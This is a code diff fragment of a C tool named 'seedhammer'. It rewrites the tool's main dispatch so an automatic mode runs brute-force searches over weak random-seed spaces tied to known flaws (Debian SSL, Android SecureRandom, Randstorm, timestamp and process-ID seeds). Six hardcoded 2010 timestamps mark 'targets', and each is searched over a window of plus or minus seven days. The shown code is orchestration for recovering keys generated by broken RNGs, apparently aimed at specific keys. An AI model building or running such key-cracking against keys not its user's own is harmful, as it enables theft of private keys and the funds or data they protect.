-        run_h20(start_val, count_val, outpath);
-    } else if (strcmp(mode, "h03") == 0) {
-        if (ts_val == 0) { fprintf(stderr, "seedhammer: --ts required for h03\n"); return 1; }
-        run_h03(ts_val, pid_start, pid_count, outpath);
-    } else {
-        fprintf(stderr, "seedhammer: unknown mode '%s'\n", mode);
-        return 1;
+        // H20: 94M
+        run_core("h20",NULL,1230768000,94675968,outpath);
+        // Debian SSL: 32768
+        run_debian_ssl(outpath);
+        // H03 for A1 ts
+        run_h03(1268728843,0,65536,outpath);
+        // H28: 10B
+        run_core("h28",NULL,0,10000000000,outpath);
+        // Android SecureRandom: 40M
+        run_core("android_sec",NULL,0,40000000,outpath);
+        // Randstorm: 30M
+        run_randstorm(0,30000000,outpath);
+        // H36 around each target (±7 days)
+        uint64_t tgt[]={1268650443000,1279120623000,1279124810000,
+                        1279334345000,1284033556000,1284530403000};
+        for(int i=0;i<6;i++)run_core("h36",NULL,tgt[i]-604800000,1209600000,outpath);
+        // H36 full: 94.6B
+        run_core("h36",NULL,1230768000000,94675968000,outpath);
+        fprintf(stderr,"[auto] All hypotheses complete.\n");
     }
+    else if(strcmp(mode,"h36")==0){if(!count){fprintf(stderr,"--count required\n");return 1;}run_core("h36",NULL,start,count,outpath);}
+    else if(strcmp(mode,"h28")==0||strcmp(mode,"h48")==0){if(!count){fprintf(stderr,"--count required\n");return 1;}run_core("h28",NULL,start,count,outpath);}
+    else if(strcmp(mode,"h20")==0){if(!count){fprintf(stderr,"--count required\n");return 1;}run_core("h20",NULL,start,count,outpath);}
+    else if(strcmp(mode,"h03")==0){if(!ts){fprintf(stderr,"--ts required\n");return 1;}run_h03(ts,pid_start,pid_cnt,outpath);}
+    else if(strcmp(mode,"debian_ssl")==0){run_debian_ssl(outpath);}
+    else if(strcmp(mode,"randstorm")==0){if(!count){fprintf(stderr,"--count required\n");return 1;}run_randstorm(start,count,outpath);}
+    else if(strcmp(mode,"android_sec")==0){if(!count){fprintf(stderr,"--count required\n");return 1;}run_core("android_sec",NULL,start,count,outpath);}
+    else{fprintf(stderr,"seedhammer: unknown mode '%s'\n",mode);return 1;}
 
-    fprintf(stderr, "SeedHammer done.\n");
+    fprintf(stderr,"SeedHammer done.\n");
     return 0;
 }
